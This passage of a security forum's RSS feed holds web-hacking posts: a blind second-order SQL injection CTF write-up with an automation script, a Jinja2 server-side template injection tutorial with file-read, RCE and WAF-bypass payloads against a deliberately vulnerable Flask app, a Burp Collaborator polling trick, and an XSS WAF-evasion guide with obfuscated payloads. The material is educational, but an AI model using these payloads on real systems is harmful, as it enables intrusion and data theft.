+Leaking contents of admin hash: TMHC{Bl1nDSQlS3c0ndorderINJecti0
+Leaking contents of admin hash: TMHC{Bl1nDSQlS3c0ndorderINJecti0n
+Leaking contents of admin hash: TMHC{Bl1nDSQlS3c0ndorderINJecti0n}
+</code></pre>
+<p><strong>Unintended methods of solving Shitter</strong>:<br>
+<em>Alternative (kudos to Morph3 (<a href="https://twitter.com/melihkaanyldz" rel="noopener nofollow ugc">https://twitter.com/melihkaanyldz</a>))</em>:<br>
+In the CTF I forgot to add a try: except: into the script to handle the python errors, which can sometimes be overly verbose. If I had added the try and except it would have just redirected to a /error page. Due to the overly verbose error messages, and the flask debug being set to True in my script, there was a certain payload that could be used, that caused the flask error message to actually display the queries output.</p>
+<p>An example of what the output would look like is:</p>
+<pre><code class="lang-auto">  File "/home/chivato/.local/lib/python2.7/site-packages/pymysql/protocol.py", line 220, in check_error
+    err.raise_mysql_exception(self._data)
+  File "/home/chivato/.local/lib/python2.7/site-packages/pymysql/err.py", line 109, in raise_mysql_exception
+    raise errorclass(errno, errval)
+InternalError: (1105, u"XPATH syntax error: '\nTMHC{Bl1nDSQlS3c0ndorderINJecti'")
+
+--&gt;
+</code></pre>
+<p>The query that breaks the challenge being:<br>
+<code>1,extractvalue(0x0a,concat(0x0a,([SQL QUERY HERE])))#</code></p>
+<p>Here is a script he developed to automate the process:</p>
+<pre data-code-wrap="python"><code class="lang-python">import requests
+
+s = requests.Session()
+
+url = "URL:PORT/"
+data = {
+    "name":"USERNAME",
+    "password":"PASSWORD"
+}
+
+r = s.post(url+"login",data=data)
+
+q = "select database()"
+
+while q != "q":
+    data = {
+         "order" : "1,extractvalue(0x0a,concat(0x0a,({})))#".format(q)
+    }
+    r = s.post(url+"settings",data=data)
+    r = s.get(url+"profile/1")
+    print r.text
+    q = raw_input("~#:")
+</code></pre>
+<p>If you enjoyed the post, learnt something new, or have any feedback / improvements, make sure to follow me on Twitter (<a href="https://twitter.com/SecGus" rel="noopener nofollow ugc">https://twitter.com/SecGus</a>).</p>
+<p>*If anyone has been able to successfully exfiltrate data via the ORDER BY clause in MySQL when the column name is hard-coded (like this <code>SELECT * FROM users WHERE name = "example" ORDER BY name USER-INPUT;</code>), I would love to know how, my DMs on here are always open, or you can reach me on twitter (see above), or via email at rat@outlook.at.</p>
+            <p><small>4 posts - 2 participants</small></p>
+            <p><a href="https://d.clarkee.co.uk/t/taking-sql-injections-further-blind-second-order-sql-injection-tmhc-ctf-shitter-writeup/18122">Read full topic</a></p>
+          ]]></description>
+          <link>https://d.clarkee.co.uk/t/taking-sql-injections-further-blind-second-order-sql-injection-tmhc-ctf-shitter-writeup/18122</link>
+          <pubDate>Tue, 17 Dec 2019 13:57:21 +0000</pubDate>
+          <discourse:topicPinned>No</discourse:topicPinned>
+          <discourse:topicClosed>Yes</discourse:topicClosed>
+          <discourse:topicArchived>No</discourse:topicArchived>
+          <guid isPermaLink="false">d.clarkee.co.uk-topic-18122</guid>
+          <source url="https://d.clarkee.co.uk/t/taking-sql-injections-further-blind-second-order-sql-injection-tmhc-ctf-shitter-writeup/18122.rss">Taking SQL Injections further (Blind Second Order SQL Injection + TMHC CTF Shitter Writeup)</source>
+        </item>
+        <item>
+          <title>Explaining Server Side Template Injections</title>
+          <dc:creator><![CDATA[chivato]]></dc:creator>
+          <category>Web Hacking</category>
+          <description><![CDATA[
+            <p>Hey, I am chivato, this is my first post on here and I hope it is of some use to people. Exploiting SSTI in strange cases will be the next post I make. Any and all feedback is appreciated &lt;3.</p>
+<p><strong>Building the environment:</strong></p>
+<p>We start with just a basic flask web application, written in python (I will be using python 2), which is as follows:</p>
+<pre><code>from flask import *
+
+app = Flask(__name__)
+
+@app.route("/")
+def home():
+    return "Hello, World!"
+
+if __name__ == "__main__":
+    app.run(debug=True, host="localhost", port=1337)
+</code></pre>
+<p>This website will just return “Hello, World!” when visited. Now, we need to add parameters so we can interact with the web application. This can be done with the “requests” part of Flask, so we just add request.args.get(‘parameter name’). In my case the parameter will be called “name”, here is how our code should look:</p>
+<pre><code>from flask import *
+
+app = Flask(__name__)
+
+@app.route("/")
+def home():
+	output = request.args.get('name')
+    return output
+
+if __name__ == "__main__":
+    app.run(debug=True, host="localhost", port=1337)
+</code></pre>
+<p>But since this always returns the value in the get request, if you go to the website without a get parameter called name, you will get an error. To fix this I included a simple if statement:</p>
+<pre><code>from flask import *
+
+app = Flask(__name__)
+
+@app.route("/")
+def home():
+        output = request.args.get('name')
+        if output:
+                pass
+        else:
+                output = "Empty"
+        return output
+
+if __name__ == "__main__":
+    app.run(debug=True, host="localhost", port=1337)
+</code></pre>
+<p>Perfect, now we have a flask app that returns the value in the get parameter and doesn’t crash. Now to implement the vulnerability, the vulnerability consists of templates being executed on the side of the server, when we have control of what the template contains, for example a vulnerability was found in Uber by the famous bug hunter known as orange, it consisted of making your profile name follow the template syntax for jinja2 (which is {{template content}} for jinja2). and then when you received the email, the template had been executed. So, imagine you set {{‘7’*7}} as your username, when you receive the email, you will see “Welcome 7777777.”</p>
+<p>As stated above, the vulnerability comes into play when the template is executed on the side of the server, and we control the input, so let’s make sure our input is rendered. This can be done with render_template_string from flask. This takes a string, and treats it as text that may have any templates in it, if it does, then it executes the template.</p>
+<pre><code>from flask import *
+
+app = Flask(__name__)
+
+@app.route("/")
+def home():
+        output = request.args.get('name')
+        output = render_template_string(output)
+        if output:
+                pass
+        else:
+                output = "Sp0re&lt;3"
+        return output
+
+if __name__ == "__main__":
+    app.run(debug=True, host="localhost", port=1337)
+</code></pre>
+<p>As you can see, now, if you visit “<a href="http://localhost:1337/?name=%7B%7B%277%27*7%7D" rel="nofollow noopener">http://localhost:1337/?name={{‘7’*7}</a>}”, you will be welcomed with “7777777”. We now have our environment setup and ready to play with (later on I will be looking at some simple WAF bypass methods, but for now we are just leaving our script as this).</p>
+<p><strong>Recongnising and exploiting the vulnerability:</strong></p>
+<p>So template engines are used VERY widely nowadays, and they exist for a variety of different languages, such as PHP, JS, Python (obviously), ruby and many more. The base of why they are useful is in case you have a large website or platform, where not many details change between pages. For example, netflix, has the same layout for it’s content, and the only things that change are: title, description, banner and some other minor details, so instead of creating a whole page per show, they just feed the data to their templates, and then the engine puts it all together.</p>
+<p>Template engines can be used for anything that follows that process of having to use the same thing tons of times, so in Uber’s example instead of making a new email every time, they had a single email template, and just changed in the name each time.</p>
+<p>So, knowing that we can execute templates, what can we actually do with that, well, honestly a lot.</p>
+<p><strong>&gt; Read the configuration.</strong></p>
+<p>This can be used to grab the SECRET_KEY which is used to sign cookies, with this, you can create and sign your own cookies.</p>
+<p>Example payload for Jinja2:<br>
+<code>{{ config }}</code></p>
+<p><strong>&gt; Read local files (LFR).</strong></p>
+<p>This can be used to do a variety of things, ranging from directly reading a flag if it is held in the templates folder with a basic {% include ‘flag.txt’ %}, to reading any file on the system this can be via the RCE payload (see next point), or via an alternative.</p>
+<p>An example payload of an alternative would be:<br>
+<code>{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}</code>  //May vary depending on version.</p>
+<p><strong>&gt; Remote command execution (RCE).</strong></p>
+<p>Finally, the remote command execution payload. Obviously the most severe and dangerous one, and can be done a variety of ways, one is going through the subclasses and finding the subprocess.Popen number:<br>
+<code>{{''.__class__.mro()[1].__subclasses__()[ HERE IS WHERE THE NUMBER WOULD GO ]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}</code></p>
+<p>Although I have had much more success with the following payload, which uses Popen without guessing the offset.<br>
+<code>{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("whoami").read().zfill(417)}}{%endif%}{% endfor %}</code><br>
+You may need to go to the end of the page to skip all the 0’s that are produced from that payload.</p>
+<p>Now that some of the basic exploits are over, we can take a look at bypass methods. Let’s start with the parameter bypass method.</p>
+<p>Imagine you have a template engine, in this case flask, that takes a value from a parameter and removes any “_” from it. This would restrict us from doing a variety of things, for example {{ __class__ }}. So, this bypass mehtod is based off of the idea that, only that parameter gets checked for the underscores. So all we have to do is pass the underscores via another parameter, and call them from our template injection.</p>
+<p>We start with calling the class attribute from request (The waf would block the underscores).<br>
+<code>{{request.__class__}}</code></p>
+<p>Then, we remove the “.” and user the |attr to tell the template that we are using request’s attributes.<br>
+<code>{{request|attr("__class__")}}</code></p>
+<p>We pipe the whole content of the “attribute” parameter to a “join” function, which sticks all of the value together, in this case it would stick “<strong>", “class” and "</strong>” together, to create <strong>class</strong>.<br>
+<code>{{request|attr(["__","class","__"]|join)}}</code></p>
+<p>We then remove one of the underscores, and just multiply the single one by two, in python, using “[STRING]”*[NUMBER] will make a new string of the previously stated strings, that amount of times. So “test”*3 would be equal to “testtest”.<br>
+<code>{{request|attr(["_"*2,"class","_"*2]|join)}}</code></p>
+<p>Finally, we tell the paytload to get the underscores from the other parameter called “usc”, and we add the underscores to the other parameter, an example URL to use against our script would be:<br>
+<code>http://localhost:1337/?name={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&amp;usc=_</code><br>
+This may just return Empty, since we set an if statement that basically stated if out rendered template is empty then just set the output to Empty.</p>
+<p>Moving on to the next bypass method, this one is used to bypass the “[”, “]” being blocked, since they are needed for the payload stated above.</p>
+<p>It is honestly just a syntax thing, but it manages to achieve the same thing, without having to use any “[”, “]”, or “_”.<br>
+Some examples are:<br>
+<code>http://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&amp;class=class&amp;usc=_</code><br>
+<code>http://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&amp;l=a&amp;a=_&amp;a=_&amp;a=class&amp;a=_&amp;a=_</code><br>
+These were pulled from an amazing page called “PayloadAllTheThings”, link can be found at the bottom of the article in the sources part.</p>
+<p>Another one is in case “.” is blocked, and it uses the Jinja2 filters with |attr():<br>
+<code>http://localhost:1337/?name={{request|attr([%22_%22*2,%22class%22,%22_%22*2]|join)}}</code></p>
+<p>Finally, a bypass method that is used in case “[”, “]”, “|join” and / or “_” is blocked, since it uses none of the previously stated characters:<br>
+<code>http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&amp;f=%s%sclass%s%s&amp;a=_</code></p>
+<p>Now these are just the base bypass payloads, but can be combined and manipulated to achieve some amazing things.</p>
+<p>Here is a payload I made myself to build a payload that leaks the config:<br>
+<code>{{request|attr(["url",request.args.usc,"for.",request.args.usc*2,request.args.1,request.args.usc*2,".current",request.args.usc,"app.",request.args.conf]|join)}}&amp;1=globals&amp;usc=_&amp;link=url&amp;conf=config</code></p>
+<p><strong>Conclusion:</strong><br>
+This has just been a basic explanation of how to setup a website vulnerable to SSTI, how the exploitation works, and some basic bypass methods for any WAF’s that you may encounter. Also would like to shout out a moderator from HackTheBox called “makelaris”, since he was actually the one who sparked my interest for SSTI’s, and has taught me a lot about them. If this post is enjoyed and appreciated I will make more about more advanced SSTI exploitation cases, and also how SSTI’s may work and be exploited in other template engines.</p>
+<p><strong>Sources:</strong></p>
+<p>PayloadAllTheThings: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md" rel="nofollow noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md</a><br>
+pequalsnp-team: <a href="https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti" rel="nofollow noopener">https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti</a><br>
+A good HackTheBox retired machine that has an SSTI step: Oz (<a href="https://www.hackthebox.eu/home/machines/profile/152" rel="nofollow noopener">https://www.hackthebox.eu/home/machines/profile/152</a>)<br>
+A writeup for Oz machine: <a href="https://0xdf.gitlab.io/2019/01/12/htb-oz.html" rel="nofollow noopener">https://0xdf.gitlab.io/2019/01/12/htb-oz.html</a><br>
+More exploring SSTI’s: <a href="https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2.html" rel="nofollow noopener">https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2.html</a><br>
+Orange’s disclosed bug bounty report from Uber: <a href="https://hackerone.com/reports/125980" rel="nofollow noopener">https://hackerone.com/reports/125980</a></p>
+            <p><small>7 posts - 4 participants</small></p>
+            <p><a href="https://d.clarkee.co.uk/t/explaining-server-side-template-injections/16297">Read full topic</a></p>
+          ]]></description>
+          <link>https://d.clarkee.co.uk/t/explaining-server-side-template-injections/16297</link>
+          <pubDate>Mon, 16 Sep 2019 20:31:15 +0000</pubDate>
+          <discourse:topicPinned>No</discourse:topicPinned>
+          <discourse:topicClosed>Yes</discourse:topicClosed>
+          <discourse:topicArchived>No</discourse:topicArchived>
+          <guid isPermaLink="false">d.clarkee.co.uk-topic-16297</guid>
+          <source url="https://d.clarkee.co.uk/t/explaining-server-side-template-injections/16297.rss">Explaining Server Side Template Injections</source>
+        </item>
+        <item>
+          <title>Achieving Persistent Access to Burp Collaborator Sessions</title>
+          <dc:creator><![CDATA[Cgboal]]></dc:creator>
+          <category>Web Hacking</category>
+          <description><![CDATA[
+            <h3>What?</h3>
+<h4>Summary</h4>
+<p>This post details the steps required to achieve persistent access to Burp Collaborator sessions which are usually volatile, and lost when current instance of Burpsuite collaborator client is closed.</p>
+<h4>Burpsuite Collaborator</h4>
+<p>In case you are currently unaware of the collaborator client in Burpsuite, it allows you to generate collaborator links and monitor DNS, HTTP, and SMTP interactions made by external services. This is an excellent feature which greatly simplifies testing for vulnerabilities such as Server-Side Request Forgery (SSRF), Blind-XSS, and various other issues which may cause external service interactions.</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/34c92c52537e14516a0734c4a4ce9b5483734716.png" alt="example" data-base62-sha1="7wXQ4BRCENUb0uepWofpG4GPRjw" width="690" height="331"></p>
+<h3>Why?</h3>
+<p>Whilst attempting to re-create the research pipeline described by James Kettle, in the whitepaper <a href="https://portswigger.net/blog/cracking-the-lens-targeting-https-hidden-attack-surface" rel="noopener nofollow ugc">cracking the lens</a>, and integrate it into my enumeration/scanning tool Ardent (which I will release here another time). I was faced with a choice of rolling my own interaction server, or living with the limitations imposed by collaborator, in that, manually generated links are only usable as long as the collaborator client is open, and do not survive exiting Burp. As the latter was unfeasible due to my goals of scanning a large range of targets over an extended period of time, I decided to see if I could piggyback off Burp collaborator in a less obvious way before taking the plunge and implementing my own solution.</p>
+<p>Initially, I found that you can run your own collaborator server, which I recommend if you follow this guide as to not piss off PortSwigger. However, even when using your own Collaborator server, there is not an obvious way to interact with it outside BurpSuite. Which leads me to the following…</p>
+<h3>How?</h3>
+<h4>Theory</h4>
+<p>Through some research I discovered that in order to maintain a simple stateful collaborator implementation, they generate the collaborator subdomains using a key derivation function based on a secret key. This secret key is generated by the Burp collaborator client when you open it, and subsequently destroyed when you close it.</p>
+<p>When polling for interactions, Burp’s collaborator server regenerates the list of collaborator domains from the secret key, and returns the interactions it has recorded against that subdomain. Thus, it is possible to capture a Collaborator secret, and use it to poll for interactions made against links generated from that secret key.</p>
+<h4>Methodology</h4>
+<p>To begin with, we must find a way to intercept a polling request from BurpSuite, to the Burp Collaborator server. As this is a HTTP based protocol, you can use two instances of BurpSuite to achieve this. However, it’s probably easier to use wireshark.</p>
+<p>However, before we are able to capture the polling request sent by BurpSuite to collaborator, we must first go to <code>Project Options-&gt;misc</code>, and set Collaborator to poll over HTTP.</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/619d4c7ea82d3f0e3eb0ea89e703cf98714225ed.png" alt="over_http" data-base62-sha1="dVxkchdomSLRCyIXagtDVr0mNit" width="687" height="500"></p>
+<p>Once this has been achieved, and wireshark is listening on the appropriate interface, go to <code>Burp-&gt;Collaborator Client</code> and press <code>Poll now</code>. In wireshark, you should now see a HTTP request to <code>http://polling.burpcollaborator.net/burpresults?biid=SECRET_KEY_HERE</code>. Take note of the secret key value sent as the value of the <code>biid</code> parameter.</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/2776ea6edba87fe2fccb85b39c91f164d5f6f4f5.png" alt="wireshark" data-base62-sha1="5D7oCK3Hv0rEqvq7MGvcX8sFdLD" width="690" height="341"></p>
+<p>Now, it’s time to get some links to use with this secret in future. To do so, generate however many links you think you may need, and save them somewhere, along with the secret key.</p>
+<p>It is now possible to retrieve interactions with any one of the generated collaborator links by sending a HTTP GET request to <code>http://polling.burpcollaborator.net/burpresults?biid=SECRET_KEY_HERE</code>. As the collaborator server generates the links using the secret key, they will never expire. However, the Burp collaborator server is ephemeral and thus may lose data if it is left there for prolonged periods. As such, it is recommended you poll regularly to collect your data.</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a61a01b4bc5bf5e453845d4e11f80ee785c452a5.png" alt="demo" data-base62-sha1="nHoYHIATmlmFvq2HheibG022b1H" width="690" height="179"></p>
+<h4>Conclusion</h4>
+<p>I hope this helps the researchers out there in some way, and if you haven’t already, I highly recommend watching James Kettle’s talk “cracking the lens” and messing about with it yourself, it’s bizarre some of the interactions you can get from services by placing links in weird places. Figuring out why you have so many pingbacks for China when you never sprayed there will keep you busy for a while ;).</p>
+            <p><small>15 posts - 8 participants</small></p>
+            <p><a href="https://d.clarkee.co.uk/t/achieving-persistent-access-to-burp-collaborator-sessions/14311">Read full topic</a></p>
+          ]]></description>
+          <link>https://d.clarkee.co.uk/t/achieving-persistent-access-to-burp-collaborator-sessions/14311</link>
+          <pubDate>Tue, 11 Jun 2019 19:47:23 +0000</pubDate>
+          <discourse:topicPinned>No</discourse:topicPinned>
+          <discourse:topicClosed>Yes</discourse:topicClosed>
+          <discourse:topicArchived>No</discourse:topicArchived>
+          <guid isPermaLink="false">d.clarkee.co.uk-topic-14311</guid>
+          <source url="https://d.clarkee.co.uk/t/achieving-persistent-access-to-burp-collaborator-sessions/14311.rss">Achieving Persistent Access to Burp Collaborator Sessions</source>
+        </item>
+        <item>
+          <title>Short &amp; simple guide on attacking Web Security</title>
+          <dc:creator><![CDATA[escrow]]></dc:creator>
+          <category>Web Hacking</category>
+          <description><![CDATA[
+            <p>Hey 0x00ers,</p>
+<p>Throughout all the posts I’ve lurked on, I’ve realised that a lot of people lack knowledge within the Web Security sector and they wouldn’t mind learning it - as it is pretty fun. Now, this thread will include a variety of different links, and it will be talking about Web Security from an attacker’s point of view and not a defender. I will supply you with all the materials I use that are really good to read and use. Of course, if you have any other materials then post below so that it makes it easier for other people to learn <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
+<p>The first thing I did was look at what attack types there are within the Web Security sector, and the website I chose for this is <a href="https://www.owasp.org/index.php/Category:Attack" rel="noopener nofollow ugc">https://www.owasp.org/index.php/Category:Attack</a> purely because it’s one of the good ones out there if not, the best.</p>
+<p>After I was familiar with certain attack types (such as XSS, CSRF, IDOR, SQLi, and more) I decided to download Burp Suite as it is a tool that has the ability to crawl for endpoints, allow you to send multiple requests to specific websites and endpoints, allows you to view the response in HTML format from that request, allows you to bruteforce simultaneously and so on. It’s the best tool that I have ever used and I wouldn’t hesitate paying for the Pro version. However, I’m not attempting to write a review on Burp so let’s move on.</p>
+<p>After I was familiar with attack types &amp; the use of Burp I decided to participte in CTF’s and hacking boxes and doing web challenges that are on <a href="https://hackthebox.eu" rel="noopener nofollow ugc">https://hackthebox.eu</a> and CTF’s like <a href="https://ctf.hacker101.com/" rel="noopener nofollow ugc">https://ctf.hacker101.com/</a> and <a href="https://picoctf.com" rel="noopener nofollow ugc">https://picoctf.com</a></p>
+<p>After I played around with the boxes and challenges, I still wanted to learn more as the journey isn’t finished (p.s: and it never will be, for anyone). I decided to start reading writeups as a lot of people attack websites differently whether it’s the use of programs, methods or filtering. A good website for reading writeups is <a href="https://pentester.land/list-of-bug-bounty-writeups.html" rel="noopener nofollow ugc">https://pentester.land/list-of-bug-bounty-writeups.html</a> which includes a ton of them. Reading writeups is a thing that every pentester / bug bounty hunter should do as it lets you know about attacking an input field in ways you might’ve not known, or how to deal with a bit of filtering and such.</p>
+<p>I’m for sure not a professional, but this was only a short guide to get people started off within the Web Security sector on the attacking side. <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
+<p>If you have anything to add, don’t hesitate to comment!</p>
+            <p><small>5 posts - 2 participants</small></p>
+            <p><a href="https://d.clarkee.co.uk/t/short-simple-guide-on-attacking-web-security/13020">Read full topic</a></p>
+          ]]></description>
+          <link>https://d.clarkee.co.uk/t/short-simple-guide-on-attacking-web-security/13020</link>
+          <pubDate>Mon, 15 Apr 2019 13:06:05 +0000</pubDate>
+          <discourse:topicPinned>No</discourse:topicPinned>
+          <discourse:topicClosed>Yes</discourse:topicClosed>
+          <discourse:topicArchived>No</discourse:topicArchived>
+          <guid isPermaLink="false">d.clarkee.co.uk-topic-13020</guid>
+          <source url="https://d.clarkee.co.uk/t/short-simple-guide-on-attacking-web-security/13020.rss">Short &amp; simple guide on attacking Web Security</source>
+        </item>
+        <item>
+          <title>[FUN] Bypass XSS Detection WAF</title>
+          <dc:creator><![CDATA[th3law]]></dc:creator>
+          <category>Web Hacking</category>
+          <description><![CDATA[
+            <p>Basically sad life like dog bite, a scary world. Sorry for my English.</p>
+<p>A little simple knowledge for everyone.</p>
+<p>This article focuses on WAF’s ability to bypass the ability to detect Cross Site Scripting (XSS).</p>
+<p>The follow:</p>
+<ul>
+<li>
+<p>Determining payload structure: Determining various payload structures for a given context provides a precise idea of the optimal testing approach.</p>
+</li>
+<li>
+<p>Probing: Probing, involves testing various strings against the target’s security mechanisms.</p>
+</li>
+<li>
+<p>Obfuscation: obfuscation/other tweaks payload if required.</p>
+</li>
+</ul>
+<p>The returned responses will help us analyze the assumptions about the solution used.</p>
+<h3>I/Introduction</h3>
+Cross-Site Scripting (XSS) attacks are a type of injection. https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
+<h3>II/HTML</h3>
+Inside Tag:
+<pre>&lt;input type="text" value="$input"&gt;</pre>
+Outside Tag:
+<pre> &lt;span&gt;You entered $input&lt;/span&gt;</pre>
+<ul>
+ 	<li><strong>Outside Tag: primary character for starting an HTML tag</strong></li>
+</ul>
+According to the HTML specification, a tag name must start with an alphabet
+<p>=&gt; the information can be used to determine the Regex match the tag name.</p>
+<pre>&lt;dEv - If fails, &lt;[a-zA-Z]+ 
+&lt;d3V - If fails, &lt;[a-zA-Z0-9]+ 
+&lt;d|3v - If fails, &lt;.+
+&lt;svg - If passes, no tag checking is in place
+&lt;dev - If fails,&lt;[a-z]+
+x&lt;dev - If passes,^&lt;[a-z]+</pre>
+<p>Without any of allowed by the security mechanism, it is almost impossible bypass. Such filtering rules are not preferred due to high false positives.</p>
+<p>If unblock, a number payload schemes -&gt; new payload created.</p>
+<p><strong><span class="hashtag">#1</span></strong></p>
+<pre>&lt;{tag}{filler}{event_handler}{?filler}={?filler}{javascript}{?filler}{&gt;,//,Space,Tab,LF}</pre>
+<p>Once an appropriate {tag} found -&gt; Predictive regular expressions are used to match filler between tag and event handler.</p>
+<pre>&lt;tag%0axxx - if fails, [\s\n]+
+&lt;tag%0dxxx&gt; - If fails, [\s\n\r+]+
+&lt;tag/~/xxx - If fails, .+
+&lt;tag xxx - If fails, {space}
+&lt;tag%09xxx - if fails, [\s]
+&lt;tag%09%09xxx - if fails, \s+
+&lt;tag/xxx - If fails, [\s/]+
+</pre>
+<p>Event handling is one of the most important parts of the payload structure.</p>
+<p>Usually it will be combined with a regular Regex</p>
+<pre>on\w+</pre>
+<p>or blacklist</p>
+<pre>on(load|click|error|show)</pre>
+<p>The first regular expression is very limited and cannot bypass, while blacklist are often bypass by using lesser known event handlers that may no t in blacklist.</p>
+<pre>&lt;tag{filler}onxxx - If fails, on\w+. If passes, on(load|click|error|show)
+&lt;tag{filler}onclick - If passes, no event handler checking regular expression is in place</pre>
+<p>If the regular expression to be ’ on\w+’ this expression cannot bypass because all event handlers start with on =&gt; next payload scheme.</p>
+<p>If the regular expression follows the blacklist, we will find event handlers that are not blacklisted. If all event handlers are blacklisted -&gt; next payload scheme.</p>
+<p>Example:</p>
+<pre>onauxclick
+ondblclick
+oncontextmenu
+onmouseleave
+ontouchcancel</pre>
+<p>The testing of fillers to = is similar filler earlier and should be only tested if ‘&lt;tag{filler}{event_handler}=d3v’ =&gt; blocked by the security mechanism.</p>
+<p>The next component JavaScript to be executed. This is the part of the payload, but making regular expression assumptions used to match it is not required because JavaScript code is arbitrary and therefore cannot match predefined patterns.</p>
+<p>=&gt; Point in now, all components of the load are put together and payload only needs to be closed</p>
+<pre>&lt;payload%0a 
+&lt;payload%0d 
+&lt;payload%09
+&lt;payload&gt;
+&lt;payload
+&lt;payload{space}
+&lt;payload//</pre>
+<p>HTML specification allows</p>
+<pre>&lt;tag{white space}{anything here}&gt;</pre>
+<p>which indicates that an HTML tag such as</p>
+<pre>&lt;a href='http://example.com' any text can be placed here as long as there's a greater-than sign somewhere later in the HTML document&gt;</pre>
+<p>is valid. This attribute of HTML tags helps an attacker to inject HTML tags in the ways mentioned above.</p>
+<p><strong><span class="hashtag">#2</span></strong></p>
+<pre>&lt;sCriPt{filler}sRc{?filler}={?filler}{url}{?filler}{&gt;,//,Space,Tab,LF}</pre>
+<p>Testing similar to the previous payload scheme. That ? can be used at the end of the URL (if the filler is not used after the URL) instead of ending the tag.</p>
+<p>Character follows ? will be considered part of the URL until &gt; is encountered. With &lt;script&gt; tags, most security rules can be detected.</p>
+<p>&lt;object&gt; tags can be created payload using the same payload scheme:</p>
+<pre>&lt;obJecT{filler}data{?filler}={?filler}{url}{?filler}{&gt;,//,Space,Tab,LF}</pre>
+<p><strong><span class="hashtag">#3</span></strong></p>
+<p>Two variants:</p>
+<ul>
+ 	<li>Plain</li>
+ 	<li>Obfuscatable</li>
+</ul>
+Simple variants combined by patterns like
+<pre>href[\s]{0,}=[\s]{0,}javascript:.</pre>
+Its structure:
+<pre>&lt;A{filler}hReF{?filler}={?filler}JavaScript:{javascript}{?filler}{&gt;,//,Space,Tab,LF}</pre>
+Obfuscatable payload variant structure:
+<pre>&lt;A{filler}hReF{?filler}={?filler}{quote}{special}:{javascript}{quote}{?filler}{&gt;,//,Space,Tab,L
+F}</pre>
+Difference is <strong>{special}</strong> component as well as the <strong>{quote}</strong><strong>.</strong>
+<p><strong>{special}</strong> ref to an obfuscated version:</p>
+<pre>j%0aAv%0dasCr%09ipt:
+J%0aa%0av%0aa%0as%0ac%0ar%0ai%0ap%0aT%0a:
+J%0aa%0dv%09a%0as%0dc%09r%0ai%0dp%09T%0d%0a:</pre>
+<p>In some cases, numeric character encoding can also be used to evade detection. As well as decimal and hexadecimal can be used.</p>
+<pre>&amp;#74;avascript&amp;colon;
+jav&amp;#x61;&amp;#115;cript:</pre>
+<p>Two techniques of obfuscation can be used together if needed</p>
+<pre>&amp;#74;ava%0a%0d%09script&amp;colon;</pre>
+<h3>Exe and Non</h3>
+Can be divided into Execution and Non-exe based on whether the injected load can be executed without any special assistance. Non-exe occurs when the input gets reflected within a HTML comment
+<pre> &lt;--$input--&gt;</pre>
+or between the following tags
+<pre>&lt;style&gt;
+&lt;title&gt;
+&lt;noembed&gt;
+&lt;template&gt;
+&lt;noscript&gt;
+&lt;textarea&gt;</pre>
+These tags must be closed to execute payload. The only difference between executable and  non-exe is the test of {closing tag} component.
+<pre>&lt;/tag&gt;
+&lt;/tAg/x&gt;
+&lt;/tag{space}&gt;
+&lt;/tag//&gt;
+&lt;/tag%0a&gt;
+&lt;/tag%0d&gt;
+&lt;/tag%09&gt;</pre>
+If closing tag scheme is discovered
+<pre>{closing tag}{any payload from executable payload section}</pre>
+=&gt; can used for successful injection.
+<h5>Inside Tag</h5>
+Primary character is the quote used to enclose the attribute value.
+<p>Example: input</p>
+<pre>&lt;input value="$input" type="text"&gt;</pre>
+<p>-&gt; Primary character "</p>
+<p>In some cases, primary character is not required to break out.</p>
+<h5>Event Handler</h5>
+Input reflected as the value of src attribute of script/iframe tag:
+<pre>&lt;script src="$input"&gt;</pre>
+=&gt; malicious script/web phishing..etc can be loaded directly
+<pre>&lt;script src="http://domain.com/malicious.js"&gt;</pre>
+<h5>Bypass URL Matching Regular Expressions</h5>
+<pre>//example.com/xss.js bypasses http(?s)://
+////////example.com/xss.js bypasses (?:http(?s):?)?//
+/\///\\/example.com/xss.js bypasses (?:http(?s):?)?//+</pre>
+<h6>srcdoc</h6>
+Input reflected as the value of srcdoc attribute of iframe tag:
+<pre>&lt;iframe srcdoc="$input"&gt;</pre>
+an escaped (HTML entities) HTML document can be supplied as the payload
+<pre>&lt;iframe srcdoc="&amp;lt;svg/onload=alert()&amp;gt;"&gt;</pre>
+<h6>Generic Attributes</h6>
+All of the above cases do not require any bypassing techniques, except the last case can be omitted using the techniques used in the HTML context.
+<pre>&lt;input type="text" value=""/onfocus="alert()$input"&gt;</pre>
+We have two categories based on the interactivity of the concerned tag:
+<p><strong>Interactable</strong></p>
+<p>Input reflected in the tags can interact (clicking, hovering, focusing etc.,) only a quote is needed to break out.</p>
+<pre>{quote}{filler}{event_handler}{?filler}={?filler}{javascript}</pre>
+<p>Checking with WAF blocked using:</p>
+<pre>x"y</pre>
+<p>Event handler an important role here because this is the only component that possible detected by WAF. Each tag supports some event handlers and is up to the user to search for such cases, but there are some event handlers that can be linked to any of the tags:</p>
+<pre>onmousedown
+onmouseenter
+onmouseleave
+onmousemove
+onmouseout
+onmouseover
+onmouseup
+onclick
+onauxclick
+ondblclick
+ondrag
+ondragend
+ondragenter
+ondragexit
+ondragleave
+ondragover
+ondragstart</pre>
